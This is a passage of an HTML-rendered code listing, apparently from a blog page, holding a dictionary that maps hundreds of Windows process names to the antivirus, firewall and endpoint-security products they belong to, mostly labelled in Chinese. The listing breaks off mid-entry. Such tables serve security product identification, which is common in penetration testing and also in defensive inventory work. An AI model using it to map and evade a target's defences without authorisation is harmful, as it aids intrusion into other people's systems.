class="line">183</span><br><span class="line">184</span><br><span class="line">185</span><br><span class="line">186</span><br><span class="line">187</span><br><span class="line">188</span><br><span class="line">189</span><br><span class="line">190</span><br><span class="line">191</span><br><span class="line">192</span><br><span class="line">193</span><br><span class="line">194</span><br><span class="line">195</span><br><span class="line">196</span><br><span class="line">197</span><br><span class="line">198</span><br><span class="line">199</span><br><span class="line">200</span><br><span class="line">201</span><br><span class="line">202</span><br><span class="line">203</span><br><span class="line">204</span><br><span class="line">205</span><br><span class="line">206</span><br><span class="line">207</span><br><span class="line">208</span><br><span class="line">209</span><br><span class="line">210</span><br><span class="line">211</span><br><span class="line">212</span><br><span class="line">213</span><br><span class="line">214</span><br><span class="line">215</span><br><span class="line">216</span><br><span class="line">217</span><br><span class="line">218</span><br><span class="line">219</span><br><span class="line">220</span><br><span class="line">221</span><br><span class="line">222</span><br><span class="line">223</span><br><span class="line">224</span><br><span class="line">225</span><br><span class="line">226</span><br><span class="line">227</span><br><span class="line">228</span><br><span class="line">229</span><br><span class="line">230</span><br><span class="line">231</span><br><span class="line">232</span><br><span class="line">233</span><br><span class="line">234</span><br><span class="line">235</span><br><span class="line">236</span><br><span class="line">237</span><br><span class="line">238</span><br><span class="line">239</span><br><span class="line">240</span><br><span class="line">241</span><br><span class="line">242</span><br><span class="line">243</span><br><span class="line">244</span><br><span class="line">245</span><br><span class="line">246</span><br><span class="line">247</span><br><span class="line">248</span><br><span class="line">249</span><br><span class="line">250</span><br><span class="line">251</span><br><span class="line">252</span><br><span class="line">253</span><br><span class="line">254</span><br><span class="line">255</span><br><span class="line">256</span><br><span class="line">257</span><br><span class="line">258</span><br><span class="line">259</span><br><span class="line">260</span><br><span class="line">261</span><br><span class="line">262</span><br><span class="line">263</span><br><span class="line">264</span><br><span class="line">265</span><br><span class="line">266</span><br><span class="line">267</span><br><span class="line">268</span><br><span class="line">269</span><br><span class="line">270</span><br><span class="line">271</span><br><span class="line">272</span><br><span class="line">273</span><br><span class="line">274</span><br><span class="line">275</span><br><span class="line">276</span><br><span class="line">277</span><br><span class="line">278</span><br><span class="line">279</span><br><span class="line">280</span><br><span class="line">281</span><br><span class="line">282</span><br><span class="line">283</span><br><span class="line">284</span><br><span class="line">285</span><br><span class="line">286</span><br><span class="line">287</span><br><span class="line">288</span><br><span class="line">289</span><br><span class="line">290</span><br><span class="line">291</span><br><span class="line">292</span><br><span class="line">293</span><br><span class="line">294</span><br><span class="line">295</span><br><span class="line">296</span><br><span class="line">297</span><br><span class="line">298</span><br><span class="line">299</span><br><span class="line">300</span><br><span class="line">301</span><br><span class="line">302</span><br><span class="line">303</span><br><span class="line">304</span><br><span class="line">305</span><br><span class="line">306</span><br><span class="line">307</span><br><span class="line">308</span><br><span class="line">309</span><br><span class="line">310</span><br><span class="line">311</span><br><span class="line">312</span><br><span class="line">313</span><br><span class="line">314</span><br><span class="line">315</span><br><span class="line">316</span><br><span class="line">317</span><br><span class="line">318</span><br><span class="line">319</span><br><span class="line">320</span><br><span class="line">321</span><br><span class="line">322</span><br><span class="line">323</span><br><span class="line">324</span><br><span class="line">325</span><br><span class="line">326</span><br><span class="line">327</span><br><span class="line">328</span><br><span class="line">329</span><br><span class="line">330</span><br><span class="line">331</span><br><span class="line">332</span><br><span class="line">333</span><br><span class="line">334</span><br><span class="line">335</span><br><span class="line">336</span><br><span class="line">337</span><br><span class="line">338</span><br><span class="line">339</span><br><span class="line">340</span><br><span class="line">341</span><br><span class="line">342</span><br><span class="line">343</span><br><span class="line">344</span><br><span class="line">345</span><br><span class="line">346</span><br><span class="line">347</span><br><span class="line">348</span><br><span class="line">349</span><br><span class="line">350</span><br><span class="line">351</span><br><span class="line">352</span><br><span class="line">353</span><br><span class="line">354</span><br><span class="line">355</span><br><span class="line">356</span><br><span class="line">357</span><br><span class="line">358</span><br><span class="line">359</span><br><span class="line">360</span><br><span class="line">361</span><br><span class="line">362</span><br><span class="line">363</span><br><span class="line">364</span><br><span class="line">365</span><br><span class="line">366</span><br><span class="line">367</span><br><span class="line">368</span><br><span class="line">369</span><br><span class="line">370</span><br><span class="line">371</span><br><span class="line">372</span><br><span class="line">373</span><br><span class="line">374</span><br><span class="line">375</span><br><span class="line">376</span><br><span class="line">377</span><br><span class="line">378</span><br><span class="line">379</span><br><span class="line">380</span><br><span class="line">381</span><br><span class="line">382</span><br><span class="line">383</span><br><span class="line">384</span><br><span class="line">385</span><br><span class="line">386</span><br><span class="line">387</span><br><span class="line">388</span><br><span class="line">389</span><br><span class="line">390</span><br><span class="line">391</span><br><span class="line">392</span><br><span class="line">393</span><br><span class="line">394</span><br><span class="line">395</span><br><span class="line">396</span><br><span class="line">397</span><br><span class="line">398</span><br><span class="line">399</span><br><span class="line">400</span><br><span class="line">401</span><br><span class="line">402</span><br><span class="line">403</span><br><span class="line">404</span><br><span class="line">405</span><br><span class="line">406</span><br><span class="line">407</span><br><span class="line">408</span><br><span class="line">409</span><br><span class="line">410</span><br><span class="line">411</span><br><span class="line">412</span><br><span class="line">413</span><br><span class="line">414</span><br><span class="line">415</span><br><span class="line">416</span><br><span class="line">417</span><br><span class="line">418</span><br><span class="line">419</span><br><span class="line">420</span><br><span class="line">421</span><br><span class="line">422</span><br><span class="line">423</span><br><span class="line">424</span><br><span class="line">425</span><br><span class="line">426</span><br><span class="line">427</span><br><span class="line">428</span><br><span class="line">429</span><br><span class="line">430</span><br><span class="line">431</span><br><span class="line">432</span><br><span class="line">433</span><br><span class="line">434</span><br><span class="line">435</span><br><span class="line">436</span><br><span class="line">437</span><br><span class="line">438</span><br><span class="line">439</span><br><span class="line">440</span><br><span class="line">441</span><br><span class="line">442</span><br><span class="line">443</span><br><span class="line">444</span><br><span class="line">445</span><br><span class="line">446</span><br><span class="line">447</span><br><span class="line">448</span><br><span class="line">449</span><br><span class="line">450</span><br><span class="line">451</span><br><span class="line">452</span><br><span class="line">453</span><br><span class="line">454</span><br><span class="line">455</span><br><span class="line">456</span><br><span class="line">457</span><br><span class="line">458</span><br><span class="line">459</span><br><span class="line">460</span><br><span class="line">461</span><br><span class="line">462</span><br><span class="line">463</span><br><span class="line">464</span><br><span class="line">465</span><br><span class="line">466</span><br><span class="line">467</span><br><span class="line">468</span><br><span class="line">469</span><br><span class="line">470</span><br><span class="line">471</span><br><span class="line">472</span><br><span class="line">473</span><br><span class="line">474</span><br><span class="line">475</span><br><span class="line">476</span><br><span class="line">477</span><br><span class="line">478</span><br><span class="line">479</span><br><span class="line">480</span><br><span class="line">481</span><br><span class="line">482</span><br><span class="line">483</span><br><span class="line">484</span><br><span class="line">485</span><br><span class="line">486</span><br><span class="line">487</span><br><span class="line">488</span><br><span class="line">489</span><br><span class="line">490</span><br><span class="line">491</span><br><span class="line">492</span><br><span class="line">493</span><br><span class="line">494</span><br><span class="line">495</span><br><span class="line">496</span><br><span class="line">497</span><br><span class="line">498</span><br><span class="line">499</span><br><span class="line">500</span><br><span class="line">501</span><br><span class="line">502</span><br><span class="line">503</span><br><span class="line">504</span><br><span class="line">505</span><br><span class="line">506</span><br><span class="line">507</span><br><span class="line">508</span><br><span class="line">509</span><br><span class="line">510</span><br><span class="line">511</span><br><span class="line">512</span><br><span class="line">513</span><br><span class="line">514</span><br><span class="line">515</span><br><span class="line">516</span><br><span class="line">517</span><br><span class="line">518</span><br><span class="line">519</span><br><span class="line">520</span><br><span class="line">521</span><br><span class="line">522</span><br><span class="line">523</span><br><span class="line">524</span><br><span class="line">525</span><br><span class="line">526</span><br><span class="line">527</span><br><span class="line">528</span><br><span class="line">529</span><br><span class="line">530</span><br></pre></td><td class="code"><pre><code class="hljs ebnf"><span class="hljs-attribute">avList</span> = &#123;<br><span class="hljs-string">&quot;360tray.exe&quot;</span>: <span class="hljs-string">&quot;360安全卫士‐实时保护&quot;</span>,<br><span class="hljs-string">&quot;360safe.exe&quot;</span>: <span class="hljs-string">&quot;360安全卫士‐主程序&quot;</span>,<br><span class="hljs-string">&quot;ZhuDongFangYu.exe&quot;</span>: <span class="hljs-string">&quot;360安全卫士‐主动防御&quot;</span>,<br><span class="hljs-string">&quot;360sd.exe&quot;</span>: <span class="hljs-string">&quot;360杀毒&quot;</span>,<br><span class="hljs-string">&quot;a2guard.exe&quot;</span>: <span class="hljs-string">&quot;a‐squared杀毒&quot;</span>,<br><span class="hljs-string">&quot;ad‐watch.exe&quot;</span>: <span class="hljs-string">&quot;Lavasoft杀毒&quot;</span>,<br><span class="hljs-string">&quot;cleaner8.exe&quot;</span>: <span class="hljs-string">&quot;The Cleaner杀毒&quot;</span>,<br><span class="hljs-string">&quot;vba32lder.exe&quot;</span>: <span class="hljs-string">&quot;vb32杀毒&quot;</span>,<br><span class="hljs-string">&quot;MongoosaGUI.exe&quot;</span>: <span class="hljs-string">&quot;Mongoosa杀毒&quot;</span>,<br><span class="hljs-string">&quot;CorantiControlCenter32.exe&quot;</span>: <span class="hljs-string">&quot;Coranti2012杀毒&quot;</span>,<br><span class="hljs-string">&quot;F‐PROT.exe&quot;</span>: <span class="hljs-string">&quot;F‐Prot AntiVirus&quot;</span>,<br><span class="hljs-string">&quot;CMCTrayIcon.exe&quot;</span>: <span class="hljs-string">&quot;CMC杀毒&quot;</span>,<br><span class="hljs-string">&quot;K7TSecurity.exe&quot;</span>: <span class="hljs-string">&quot;K7杀毒&quot;</span>,<br><span class="hljs-string">&quot;UnThreat.exe&quot;</span>: <span class="hljs-string">&quot;UnThreat杀毒&quot;</span>,<br><span class="hljs-string">&quot;CKSoftShiedAntivirus4.exe&quot;</span>: <span class="hljs-string">&quot;Shield Antivirus杀毒&quot;</span>,<br><span class="hljs-string">&quot;AVWatchService.exe&quot;</span>: <span class="hljs-string">&quot;VIRUSfighter杀毒&quot;</span>,<br><span class="hljs-string">&quot;ArcaTasksService.exe&quot;</span>: <span class="hljs-string">&quot;ArcaVir杀毒&quot;</span>,<br><span class="hljs-string">&quot;iptray.exe&quot;</span>: <span class="hljs-string">&quot;Immunet杀毒&quot;</span>,<br><span class="hljs-string">&quot;PSafeSysTray.exe&quot;</span>: <span class="hljs-string">&quot;PSafe杀毒&quot;</span>,<br><span class="hljs-string">&quot;nspupsvc.exe&quot;</span>: <span class="hljs-string">&quot;nProtect杀毒&quot;</span>,<br><span class="hljs-string">&quot;SpywareTerminatorShield.exe&quot;</span>: <span class="hljs-string">&quot;SpywareTerminator反间谍软件&quot;</span>,<br><span class="hljs-string">&quot;BKavService.exe&quot;</span>: <span class="hljs-string">&quot;Bkav杀毒&quot;</span>,<br><span class="hljs-string">&quot;MsMpEng.exe&quot;</span>: <span class="hljs-string">&quot;Microsoft Security Essentials&quot;</span>,<br><span class="hljs-string">&quot;SBAMSvc.exe&quot;</span>: <span class="hljs-string">&quot;VIPRE&quot;</span>,<br><span class="hljs-string">&quot;ccSvcHst.exe&quot;</span>: <span class="hljs-string">&quot;Norton杀毒&quot;</span>,<br><span class="hljs-string">&quot;f‐secure.exe&quot;</span>: <span class="hljs-string">&quot;冰岛&quot;</span>,<br><span class="hljs-string">&quot;avp.exe&quot;</span>: <span class="hljs-string">&quot;Kaspersky&quot;</span>,<br><span class="hljs-string">&quot;KvMonXP.exe&quot;</span>: <span class="hljs-string">&quot;江民杀毒&quot;</span>,<br><span class="hljs-string">&quot;RavMonD.exe&quot;</span>: <span class="hljs-string">&quot;瑞星杀毒&quot;</span>,<br><span class="hljs-string">&quot;Mcshield.exe&quot;</span>: <span class="hljs-string">&quot;McAfee&quot;</span>,<br><span class="hljs-string">&quot;Tbmon.exe&quot;</span>: <span class="hljs-string">&quot;McAfee&quot;</span>,<br><span class="hljs-string">&quot;Frameworkservice.exe&quot;</span>: <span class="hljs-string">&quot;McAfee&quot;</span>,<br><span class="hljs-string">&quot;egui.exe&quot;</span>: <span class="hljs-string">&quot;ESET NOD32&quot;</span>,<br><span class="hljs-string">&quot;ekrn.exe&quot;</span>: <span class="hljs-string">&quot;ESET NOD32&quot;</span>,<br><span class="hljs-string">&quot;eguiProxy.exe&quot;</span>: <span class="hljs-string">&quot;ESET NOD32&quot;</span>,<br><span class="hljs-string">&quot;kxetray.exe&quot;</span>: <span class="hljs-string">&quot;金山毒霸&quot;</span>,<br><span class="hljs-string">&quot;knsdtray.exe&quot;</span>: <span class="hljs-string">&quot;可牛杀毒&quot;</span>,<br><span class="hljs-string">&quot;TMBMSRV.exe&quot;</span>: <span class="hljs-string">&quot;趋势杀毒&quot;</span>,<br><span class="hljs-string">&quot;avcenter.exe&quot;</span>: <span class="hljs-string">&quot;Avira(小红伞)&quot;</span>,<br><span class="hljs-string">&quot;avguard.exe&quot;</span>: <span class="hljs-string">&quot;Avira(小红伞)&quot;</span>,<br><span class="hljs-string">&quot;avgnt.exe&quot;</span>: <span class="hljs-string">&quot;Avira(小红伞)&quot;</span>,<br><span class="hljs-string">&quot;sched.exe&quot;</span>: <span class="hljs-string">&quot;Avira(小红伞)&quot;</span>,<br><span class="hljs-string">&quot;ashDisp.exe&quot;</span>: <span class="hljs-string">&quot;Avast网络安全&quot;</span>,<br><span class="hljs-string">&quot;rtvscan.exe&quot;</span>: <span class="hljs-string">&quot;诺顿杀毒&quot;</span>,<br><span class="hljs-string">&quot;ccapp.exe&quot;</span>: <span class="hljs-string">&quot;SymantecNorton&quot;</span>,<br><span class="hljs-string">&quot;NPFMntor.exe&quot;</span>: <span class="hljs-string">&quot;Norton杀毒软件&quot;</span>,<br><span class="hljs-string">&quot;ccSetMgr.exe&quot;</span>: <span class="hljs-string">&quot;赛门铁克&quot;</span>,<br><span class="hljs-string">&quot;ccRegVfy.exe&quot;</span>: <span class="hljs-string">&quot;Norton杀毒软件&quot;</span>,<br><span class="hljs-string">&quot;ksafe.exe&quot;</span>: <span class="hljs-string">&quot;金山卫士&quot;</span>,<br><span class="hljs-string">&quot;QQPCRTP.exe&quot;</span>: <span class="hljs-string">&quot;QQ电脑管家&quot;</span>,<br><span class="hljs-string">&quot;avgwdsvc.exe&quot;</span>: <span class="hljs-string">&quot;AVG杀毒&quot;</span>,<br><span class="hljs-string">&quot;QUHLPSVC.exe&quot;</span>: <span class="hljs-string">&quot;QUICK HEAL杀毒&quot;</span>,<br><span class="hljs-string">&quot;mssecess.exe&quot;</span>: <span class="hljs-string">&quot;微软杀毒&quot;</span>,<br><span class="hljs-string">&quot;SavProgress.exe&quot;</span>: <span class="hljs-string">&quot;Sophos杀毒&quot;</span>,<br><span class="hljs-string">&quot;SophosUI.exe&quot;</span>: <span class="hljs-string">&quot;Sophos杀毒&quot;</span>,<br><span class="hljs-string">&quot;SophosFS.exe&quot;</span>: <span class="hljs-string">&quot;Sophos杀毒&quot;</span>,<br><span class="hljs-string">&quot;SophosHealth.exe&quot;</span>: <span class="hljs-string">&quot;Sophos杀毒&quot;</span>,<br><span class="hljs-string">&quot;SophosSafestore64.exe&quot;</span>: <span class="hljs-string">&quot;Sophos杀毒&quot;</span>,<br><span class="hljs-string">&quot;SophosCleanM.exe&quot;</span>: <span class="hljs-string">&quot;Sophos杀毒&quot;</span>,<br><span class="hljs-string">&quot;fsavgui.exe&quot;</span>: <span class="hljs-string">&quot;F‐Secure杀毒&quot;</span>,<br><span class="hljs-string">&quot;vsserv.exe&quot;</span>: <span class="hljs-string">&quot;比特梵德&quot;</span>,<br><span class="hljs-string">&quot;remupd.exe&quot;</span>: <span class="hljs-string">&quot;熊猫卫士&quot;</span>,<br><span class="hljs-string">&quot;FortiTray.exe&quot;</span>: <span class="hljs-string">&quot;飞塔&quot;</span>,<br><span class="hljs-string">&quot;safedog.exe&quot;</span>: <span class="hljs-string">&quot;安全狗&quot;</span>,<br><span class="hljs-string">&quot;parmor.exe&quot;</span>: <span class="hljs-string">&quot;木马克星&quot;</span>,<br><span class="hljs-string">&quot;Iparmor.exe.exe&quot;</span>: <span class="hljs-string">&quot;木马克星&quot;</span>,<br><span class="hljs-string">&quot;beikesan.exe&quot;</span>: <span class="hljs-string">&quot;贝壳云安全&quot;</span>,<br><span class="hljs-string">&quot;KSWebShield.exe&quot;</span>: <span class="hljs-string">&quot;金山网盾&quot;</span>,<br><span class="hljs-string">&quot;TrojanHunter.exe&quot;</span>: <span class="hljs-string">&quot;木马猎手&quot;</span>,<br><span class="hljs-string">&quot;GG.exe&quot;</span>: <span class="hljs-string">&quot;巨盾网游安全盾&quot;</span>,<br><span class="hljs-string">&quot;adam.exe&quot;</span>: <span class="hljs-string">&quot;绿鹰安全精灵&quot;</span>,<br><span class="hljs-string">&quot;AST.exe&quot;</span>: <span class="hljs-string">&quot;超级巡警&quot;</span>,<br><span class="hljs-string">&quot;ananwidget.exe&quot;</span>: <span class="hljs-string">&quot;墨者安全专家&quot;</span>,<br><span class="hljs-string">&quot;AVK.exe&quot;</span>: <span class="hljs-string">&quot;AntiVirusKit&quot;</span>,<br><span class="hljs-string">&quot;avg.exe&quot;</span>: <span class="hljs-string">&quot;AVG Anti‐Virus&quot;</span>,<br><span class="hljs-string">&quot;spidernt.exe&quot;</span>: <span class="hljs-string">&quot;Dr.web&quot;</span>,<br><span class="hljs-string">&quot;avgaurd.exe&quot;</span>: <span class="hljs-string">&quot;Avira Antivir&quot;</span>,<br><span class="hljs-string">&quot;vsmon.exe&quot;</span>: <span class="hljs-string">&quot;Zone Alarm&quot;</span>,<br><span class="hljs-string">&quot;cpf.exe&quot;</span>: <span class="hljs-string">&quot;Comodo&quot;</span>,<br><span class="hljs-string">&quot;outpost.exe&quot;</span>: <span class="hljs-string">&quot;Outpost Firewall&quot;</span>,<br><span class="hljs-string">&quot;rfwmain.exe&quot;</span>: <span class="hljs-string">&quot;瑞星防火墙&quot;</span>,<br><span class="hljs-string">&quot;kpfwtray.exe&quot;</span>: <span class="hljs-string">&quot;金山网镖&quot;</span>,<br><span class="hljs-string">&quot;FYFireWall.exe&quot;</span>: <span class="hljs-string">&quot;风云防火墙&quot;</span>,<br><span class="hljs-string">&quot;MPMon.exe&quot;</span>: <span class="hljs-string">&quot;微点主动防御&quot;</span>,<br><span class="hljs-string">&quot;pfw.exe&quot;</span>: <span class="hljs-string">&quot;天网防火墙&quot;</span>,<br><span class="hljs-string">&quot;BaiduSdSvc.exe&quot;</span>: <span class="hljs-string">&quot;百度杀毒‐服务进程&quot;</span>,<br><span class="hljs-string">&quot;BaiduSdTray.exe&quot;</span>: <span class="hljs-string">&quot;百度杀毒‐托盘进程&quot;</span>,<br><span class="hljs-string">&quot;BaiduSd.exe&quot;</span>: <span class="hljs-string">&quot;百度杀毒‐主程序&quot;</span>,<br><span class="hljs-string">&quot;SafeDogGuardCenter.exe&quot;</span>: <span class="hljs-string">&quot;安全狗&quot;</span>,<br><span class="hljs-string">&quot;safedogupdatecenter.exe&quot;</span>: <span class="hljs-string">&quot;安全狗&quot;</span>,<br><span class="hljs-string">&quot;safedogguardcenter.exe&quot;</span>: <span class="hljs-string">&quot;安全狗&quot;</span>,<br><span class="hljs-string">&quot;SafeDogSiteIIS.exe&quot;</span>: <span class="hljs-string">&quot;安全狗&quot;</span>,<br><span class="hljs-string">&quot;SafeDogTray.exe&quot;</span>: <span class="hljs-string">&quot;安全狗&quot;</span>,<br><span class="hljs-string">&quot;SafeDogServerUI.exe&quot;</span>: <span class="hljs-string">&quot;安全狗&quot;</span>,<br><span class="hljs-string">&quot;D_Safe_Manage.exe&quot;</span>: <span class="hljs-string">&quot;D盾&quot;</span>,<br><span class="hljs-string">&quot;d_manage.exe&quot;</span>: <span class="hljs-string">&quot;D盾&quot;</span>,<br><span class="hljs-string">&quot;yunsuo_agent_service.exe&quot;</span>: <span class="hljs-string">&quot;云锁&quot;</span>,<br><span class="hljs-string">&quot;yunsuo_agent_daemon.exe&quot;</span>: <span class="hljs-string">&quot;云锁&quot;</span>,<br><span class="hljs-string">&quot;HwsPanel.exe&quot;</span>: <span class="hljs-string">&quot;护卫神&quot;</span>,<br><span class="hljs-string">&quot;hws_ui.exe&quot;</span>: <span class="hljs-string">&quot;护卫神&quot;</span>,<br><span class="hljs-string">&quot;hws.exe&quot;</span>: <span class="hljs-string">&quot;护卫神&quot;</span>,<br><span class="hljs-string">&quot;hwsd.exe&quot;</span>: <span class="hljs-string">&quot;护卫神&quot;</span>,<br><span class="hljs-string">&quot;hipstray.exe&quot;</span>: <span class="hljs-string">&quot;火绒&quot;</span>,<br><span class="hljs-string">&quot;wsctrl.exe&quot;</span>: <span class="hljs-string">&quot;火绒&quot;</span>,<br><span class="hljs-string">&quot;usysdiag.exe&quot;</span>: <span class="hljs-string">&quot;火绒&quot;</span>,<br><span class="hljs-string">&quot;SPHINX.exe&quot;</span>: <span class="hljs-string">&quot;SPHINX防火墙&quot;</span>,<br><span class="hljs-string">&quot;bddownloader.exe&quot;</span>: <span class="hljs-string">&quot;百度卫士&quot;</span>,<br><span class="hljs-string">&quot;baiduansvx.exe&quot;</span>: <span class="hljs-string">&quot;百度卫士‐主进程&quot;</span>,<br><span class="hljs-string">&quot;AvastUI.exe&quot;</span>: <span class="hljs-string">&quot;Avast!5主程序&quot;</span>,<br><span class="hljs-string">&quot;emet_agent.exe&quot;</span>: <span class="hljs-string">&quot;EMET&quot;</span>,<br><span class="hljs-string">&quot;emet_service.exe&quot;</span>: <span class="hljs-string">&quot;EMET&quot;</span>,<br><span class="hljs-string">&quot;firesvc.exe&quot;</span>: <span class="hljs-string">&quot;McAfee&quot;</span>,<br><span class="hljs-string">&quot;firetray.exe&quot;</span>: <span class="hljs-string">&quot;McAfee&quot;</span>,<br><span class="hljs-string">&quot;hipsvc.exe&quot;</span>: <span class="hljs-string">&quot;McAfee&quot;</span>,<br><span class="hljs-string">&quot;mfevtps.exe&quot;</span>: <span class="hljs-string">&quot;McAfee&quot;</span>,<br><span class="hljs-string">&quot;mcafeefire.exe&quot;</span>: <span class="hljs-string">&quot;McAfee&quot;</span>,<br><span class="hljs-string">&quot;scan32.exe&quot;</span>: <span class="hljs-string">&quot;McAfee&quot;</span>,<br><span class="hljs-string">&quot;shstat.exe&quot;</span>: <span class="hljs-string">&quot;McAfee&quot;</span>,<br><span class="hljs-string">&quot;vstskmgr.exe&quot;</span>: <span class="hljs-string">&quot;McAfee&quot;</span>,<br><span class="hljs-string">&quot;engineserver.exe&quot;</span>: <span class="hljs-string">&quot;McAfee&quot;</span>,<br><span class="hljs-string">&quot;mfeann.exe&quot;</span>: <span class="hljs-string">&quot;McAfee&quot;</span>,<br><span class="hljs-string">&quot;mcscript.exe&quot;</span>: <span class="hljs-string">&quot;McAfee&quot;</span>,<br><span class="hljs-string">&quot;updaterui.exe&quot;</span>: <span class="hljs-string">&quot;McAfee&quot;</span>,<br><span class="hljs-string">&quot;udaterui.exe&quot;</span>: <span class="hljs-string">&quot;McAfee&quot;</span>,<br><span class="hljs-string">&quot;naprdmgr.exe&quot;</span>: <span class="hljs-string">&quot;McAfee&quot;</span>,<br><span class="hljs-string">&quot;cleanup.exe&quot;</span>: <span class="hljs-string">&quot;McAfee&quot;</span>,<br><span class="hljs-string">&quot;cmdagent.exe&quot;</span>: <span class="hljs-string">&quot;McAfee&quot;</span>,<br><span class="hljs-string">&quot;frminst.exe&quot;</span>: <span class="hljs-string">&quot;McAfee&quot;</span>,<br><span class="hljs-string">&quot;mcscript_inuse.exe&quot;</span>: <span class="hljs-string">&quot;McAfee&quot;</span>,<br><span class="hljs-string">&quot;mctray.exe&quot;</span>: <span class="hljs-string">&quot;McAfee&quot;</span>,<br><span class="hljs-string">&quot;_avp32.exe&quot;</span>: <span class="hljs-string">&quot;卡巴斯基&quot;</span>,<br><span class="hljs-string">&quot;_avpcc.exe&quot;</span>: <span class="hljs-string">&quot;卡巴斯基&quot;</span>,<br><span class="hljs-string">&quot;_avpm.exe&quot;</span>: <span class="hljs-string">&quot;卡巴斯基&quot;</span>,<br><span class="hljs-string">&quot;aAvgApi.exe&quot;</span>: <span class="hljs-string">&quot;AVG&quot;</span>,<br><span class="hljs-string">&quot;ackwin32.exe&quot;</span>: <span class="hljs-string">&quot;已知杀软进程,名称暂未收录&quot;</span>,<br><span class="hljs-string">&quot;alertsvc.exe&quot;</span>: <span class="hljs-string">&quot;Norton AntiVirus&quot;</span>,<br><span class="hljs-string">&quot;alogserv.exe&quot;</span>: <span class="hljs-string">&quot;McAfee VirusScan&quot;</span>,<br><span class="hljs-string">&quot;anti‐trojan.exe&quot;</span>: <span class="hljs-string">&quot;Anti‐Trojan Elite&quot;</span>,<br><span class="hljs-string">&quot;arr.exe&quot;</span>: <span class="hljs-string">&quot;Application Request Route&quot;</span>,<br><span class="hljs-string">&quot;atguard.exe&quot;</span>: <span class="hljs-string">&quot;AntiVir&quot;</span>,<br><span class="hljs-string">&quot;atupdater.exe&quot;</span>: <span class="hljs-string">&quot;已知杀软进程,名称暂未收录&quot;</span>,<br><span class="hljs-string">&quot;atwatch.exe&quot;</span>: <span class="hljs-string">&quot;Mustek&quot;</span>,<br><span class="hljs-string">&quot;au.exe&quot;</span>: <span class="hljs-string">&quot;NSIS&quot;</span>,<br><span class="hljs-string">&quot;aupdate.exe&quot;</span>: <span class="hljs-string">&quot;Symantec&quot;</span>,<br><span class="hljs-string">&quot;auto‐protect.nav80try.exe&quot;</span>: <span class="hljs-string">&quot;已知杀软进程,名称暂未收录&quot;</span>,<br><span class="hljs-string">&quot;autodown.exe&quot;</span>: <span class="hljs-string">&quot;AntiVirus AutoUpdater&quot;</span>,<br><span class="hljs-string">&quot;avconsol.exe&quot;</span>: <span class="hljs-string">&quot;McAfee&quot;</span>,<br><span class="hljs-string">&quot;avgcc32.exe&quot;</span>: <span class="hljs-string">&quot;AVG&quot;</span>,<br><span class="hljs-string">&quot;avgctrl.exe&quot;</span>: <span class="hljs-string">&quot;AVG&quot;</span>,<br><span class="hljs-string">&quot;avgemc.exe&quot;</span>: <span class="hljs-string">&quot;AVG&quot;</span>,<br><span class="hljs-string">&quot;avgrsx.exe&quot;</span>: <span class="hljs-string">&quot;AVG&quot;</span>,<br><span class="hljs-string">&quot;avgserv.exe&quot;</span>: <span class="hljs-string">&quot;AVG&quot;</span>,<br><span class="hljs-string">&quot;avgserv9.exe&quot;</span>: <span class="hljs-string">&quot;AVG&quot;</span>,<br><span class="hljs-string">&quot;avgw.exe&quot;</span>: <span class="hljs-string">&quot;AVG&quot;</span>,<br><span class="hljs-string">&quot;avkpop.exe&quot;</span>: <span class="hljs-string">&quot;G DATA SOFTWARE AG&quot;</span>,<br><span class="hljs-string">&quot;avkserv.exe&quot;</span>: <span class="hljs-string">&quot;G DATA SOFTWARE AG&quot;</span>,<br><span class="hljs-string">&quot;avkservice.exe&quot;</span>: <span class="hljs-string">&quot;G DATA SOFTWARE AG&quot;</span>,<br><span class="hljs-string">&quot;avkwctl9.exe&quot;</span>: <span class="hljs-string">&quot;G DATA SOFTWARE AG&quot;</span>,<br><span class="hljs-string">&quot;avltmain.exe&quot;</span>: <span class="hljs-string">&quot;Panda Software Aplication&quot;</span>,<br><span class="hljs-string">&quot;avnt.exe&quot;</span>: <span class="hljs-string">&quot;H+BEDV Datentechnik GmbH&quot;</span>,<br><span class="hljs-string">&quot;avp32.exe&quot;</span>: <span class="hljs-string">&quot;Kaspersky Anti‐Virus&quot;</span>,<br><span class="hljs-string">&quot;avpcc.exe&quot;</span>: <span class="hljs-string">&quot; Kaspersky AntiVirus&quot;</span>,<br><span class="hljs-string">&quot;avpdos32.exe&quot;</span>: <span class="hljs-string">&quot; Kaspersky AntiVirus&quot;</span>,<br><span class="hljs-string">&quot;avpm.exe&quot;</span>: <span class="hljs-string">&quot; Kaspersky AntiVirus&quot;</span>,<br><span class="hljs-string">&quot;avptc32.exe&quot;</span>: <span class="hljs-string">&quot; Kaspersky AntiVirus&quot;</span>,<br><span class="hljs-string">&quot;avpupd.exe&quot;</span>: <span class="hljs-string">&quot; Kaspersky AntiVirus&quot;</span>,<br><span class="hljs-string">&quot;avsynmgr.exe&quot;</span>: <span class="hljs-string">&quot;McAfee&quot;</span>,<br><span class="hljs-string">&quot;avwin.exe&quot;</span>: <span class="hljs-string">&quot; H+BEDV&quot;</span>,<br><span class="hljs-string">&quot;bargains.exe&quot;</span>: <span class="hljs-string">&quot;Exact Advertising SpyWare&quot;</span>,<br><span class="hljs-string">&quot;beagle.exe&quot;</span>: <span class="hljs-string">&quot;Avast&quot;</span>,<br><span class="hljs-string">&quot;blackd.exe&quot;</span>: <span class="hljs-string">&quot;BlackICE&quot;</span>,<br><span class="hljs-string">&quot;blackice.exe&quot;</span>: <span class="hljs-string">&quot;BlackICE&quot;</span>,<br><span class="hljs-string">&quot;blink.exe&quot;</span>: <span class="hljs-string">&quot;micromedia&quot;</span>,<br><span class="hljs-string">&quot;blss.exe&quot;</span>: <span class="hljs-string">&quot;CBlaster&quot;</span>,<br><span class="hljs-string">&quot;bootwarn.exe&quot;</span>: <span class="hljs-string">&quot;Symantec&quot;</span>,<br><span class="hljs-string">&quot;bpc.exe&quot;</span>: <span class="hljs-string">&quot;Grokster&quot;</span>,<br><span class="hljs-string">&quot;brasil.exe&quot;</span>: <span class="hljs-string">&quot;Exact Advertising&quot;</span>,<br><span class="hljs-string">&quot;ccevtmgr.exe&quot;</span>: <span class="hljs-string">&quot;Norton Internet Security&quot;</span>,<br><span class="hljs-string">&quot;cdp.exe&quot;</span>: <span class="hljs-string">&quot;CyberLink Corp.&quot;</span>,<br><span class="hljs-string">&quot;cfd.exe&quot;</span>: <span class="hljs-string">&quot;Motive Communications&quot;</span>,<br><span class="hljs-string">&quot;cfgwiz.exe&quot;</span>: <span class="hljs-string">&quot; Norton AntiVirus&quot;</span>,<br><span class="hljs-string">&quot;claw95.exe&quot;</span>: <span class="hljs-string">&quot;已知杀软进程,名称暂未收录&quot;</span>,<br><span 